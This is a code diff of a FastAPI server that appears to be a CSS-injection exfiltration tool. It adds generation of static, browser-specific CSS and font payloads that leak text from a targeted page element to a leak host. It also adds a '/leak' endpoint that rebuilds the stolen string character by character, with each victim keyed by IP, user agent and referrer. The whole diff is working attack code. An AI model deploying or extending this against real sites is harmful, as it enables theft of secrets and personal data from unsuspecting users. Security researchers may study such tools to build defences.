@@ -4,12 +4,13 @@ from fastapi.responses import Response
 from .schemas import (
     DynamicLeakSetupParams,
     StaticLeakSetupParams,
-    DynamicLeakParams,
-    DynamicLeakState,
+    LeakParams,
+    LeakState,
     settings,
 )
 from .logger import logger
 from .cssgen import dynamic as dynamic_css
+from .cssgen import static as static_css
 from .fontgen import dynamic as dynamic_font
 import asyncio
 from user_agents import parse
@@ -17,7 +18,8 @@ from typing import Literal
 import base64
 
 # Add in-memory storage for leak states and events
-leak_states: dict[str, DynamicLeakState] = {}
+leak_states: dict[str, LeakState] = {}
+static_leak_setup: dict[str, StaticLeakSetupParams] = {}
 leak_events: dict[str, asyncio.Event] = {}
 
 app = FastAPI(
@@ -53,6 +55,20 @@ def get_browser(request: Request) -> Literal["chrome", "safari", "firefox", "all
     return browser
 
 
+def get_remote_ip(request: Request) -> str:
+    if "X-Forwarded-For" in request.headers:
+        # Get the first IP in the X-Forwarded-For header
+        return request.headers["X-Forwarded-For"].split(",")[0].strip()
+    return request.client.host if request.client else "127.0.0.1"
+
+
+def get_request_key(request: Request) -> str:
+    user_agent = request.headers.get("user-agent", "")
+    referrer = request.headers.get("referer", "")
+
+    return get_remote_ip(request) + "||" + user_agent + "||" + referrer
+
+
 @app.get("/")
 async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
     logger.debug("Handling index request with params: %s", params)
@@ -85,7 +101,7 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
                 base_params.alphabet = base_params.alphabet.replace(
                     " ", ""
                 )  # Safari doesn't support spaces for some reason
-            leak_states[new_id] = DynamicLeakState(
+            leak_states[new_id] = LeakState(
                 id=new_id,
                 setup=base_params,
                 step=0,
@@ -179,26 +195,102 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
 
 
 @app.get("/static")
-def generate_static_payload(params: StaticLeakSetupParams = Depends()):
+def generate_static_payload(
+    request: Request, params: StaticLeakSetupParams = Depends()
+):
     logger.debug("Generating static payload with params: %s", params)
-    return {"host": settings.host, **params.model_dump()}
+
+    # Detect browser
+    browser = get_browser(request) if params.browser == "all" else params.browser
+
+    if browser != "chrome" and browser != "firefox":
+        raise NotImplementedError("Only Chrome and Firefox are supported for now")
+
+    # Generate a new ID
+    new_id = str(len(static_leak_setup) + 1)
+
+    # Store the static leak setup
+    static_leak_setup[new_id] = params
+
+    # Generate font path
+    font_path, step_map = dynamic_font.generate(
+        params.alphabet, idx_max=params.length, strip=params.strip, prefix=params.prefix
+    )
+
+    # Get appropriate template
+    if browser == "chrome":
+        template_name = "static.css.jinja"
+    elif browser == "firefox":
+        template_name = "static-anim.css.jinja"
+
+    template = templates.get_template(template_name)
+
+    # Generate CSS using the static module
+    css = static_css.generate(
+        id=new_id,
+        idx_max=params.length,
+        step_map=step_map,
+        template=template,
+        font_path=font_path,
+        alphabet_size=len(params.alphabet),
+        host=settings.host,
+        host_leak=settings.host_leak,
+        leak_selector=params.selector,
+        browser=browser,
+    )
+
+    return Response(content=css, media_type="text/css")
 
 
 @app.get("/leak")
-def leak(request: Request, params: DynamicLeakParams = Depends()):
+def leak(request: Request, params: LeakParams = Depends()):
     logger.debug("Handling leak request with params: %s", params)
+    state, id = None, None
 
     if params.id in leak_states:
+        id = params.id
         state = leak_states[params.id]
+    elif params.sid:
+        # Handle static leak using sid
+        id = get_request_key(request) + "||" + params.sid
+
+        # Create state if it doesn't exist
+        if id not in leak_states and params.sid in static_leak_setup:
+            static_params = static_leak_setup[params.sid]
+            leak_states[id] = LeakState(
+                id=id,
+                setup=static_params,
+                reconstruction="",
+                step=0,
+                browser=get_browser(request),
+            )
+
+        if id in leak_states:
+            state = leak_states[id]
+
+    if state:
         # Update reconstruction and step
-        if params.idx == len(state.setup.alphabet):
-            state.reconstruction += "🗅"
+        if params.step is None or params.step >= len(state.reconstruction):
+            if params.idx == len(state.setup.alphabet):
+                state.reconstruction += "🗅"
+            else:
+                state.reconstruction += state.setup.alphabet[params.idx]
+            state.step += 1
         else:
-            state.reconstruction += state.setup.alphabet[params.idx]
+            state.reconstruction = list(state.reconstruction)
+            chr = (
+                "🗅"
+                if params.idx == len(state.setup.alphabet)
+                else state.setup.alphabet[params.idx]
+            )
+            if not (
+                state.reconstruction[params.step] != chr
+                and state.reconstruction[params.step - 1] == chr
+            ):
+                state.reconstruction[params.step] = chr
+            state.reconstruction = "".join(state.reconstruction)
 
-        state.step += 1
-
-        logger.info("Leak update [%s]: %s", params.id, state.reconstruction)
+        logger.info("Leak update [%s]: %s", id, state.reconstruction)
 
         # Notify waiting requests
         if params.id in leak_events:
@@ -253,5 +345,32 @@ def test(request: Request):
 
     return Response(
         content=templates.get_template("test-dynamic-all.html.jinja").render(),
+        media_type="text/html",
+    )
+
+
+@app.get("/test-static")
+def test_static(request: Request):
+    logger.debug("Handling static test request")
+    browser = get_browser(request)
+
+    if browser == "chrome":
+        return Response(
+            content=templates.get_template("test-static-chrome.html.jinja").render(),
+            media_type="text/html",
+        )
+    if browser == "safari":
+        return Response(
+            content=templates.get_template("test-static-safari.html.jinja").render(),
+            media_type="text/html",
+        )
+    if browser == "firefox":
+        return Response(
+            content=templates.get_template("test-static-firefox.html.jinja").render(),
+            media_type="text/html",
+        )
+
+    return Response(
+        content=templates.get_template("test-static-all.html.jinja").render(),
         media_type="text/html",
     )
